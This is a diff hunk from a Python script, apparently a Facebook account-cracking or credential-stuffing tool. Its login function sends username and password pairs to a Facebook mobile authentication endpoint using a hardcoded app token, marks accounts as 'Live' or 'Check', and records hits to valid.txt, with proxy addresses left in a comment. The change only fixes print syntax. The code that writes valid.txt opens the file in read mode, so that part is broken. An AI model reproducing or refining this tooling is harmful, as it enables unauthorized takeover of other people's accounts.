@@ -45,7 +45,7 @@ def login(user,pw,cek=False):
           r = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email='+user+'&locale=en_US&password='+pw+'&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm') #proxies={'http':'http://36.94.70.234:80','https':'https://182.253.94.60:8080'}
           q=json.loads(r.text)
           if 'EAA' in r.text:
-             print('\r\033[00m[\033[92mLive\033[00m]'+user+'\033[96m|\033[00m'+pw,                         end="")
+             print('\r\033[00m[\033[92mLive\033[00m]'+user+'\033[96m|\033[00m'+pw                         ,end="")
              result+=1
              if cek:
                   valid.append(user+'|'+pw)
@@ -53,7 +53,7 @@ def login(user,pw,cek=False):
                   with open('valid.txt') as f:
                        f.write(user + '|' + pw + '\n')
           elif 'www.facebook.com' in q['error_msg']:
-             print('\r\033[00m[\033[93mCheck\033[00m]'+user+'\033[96m|\033[00m'+pw,                       m end="")
+             print('\r\033[00m[\033[93mCheck\033[00m]'+user+'\033[96m|\033[00m'+pw                        ,end="")
              chek+=1
              if cek:
                   check.append(user+'|'+pw)
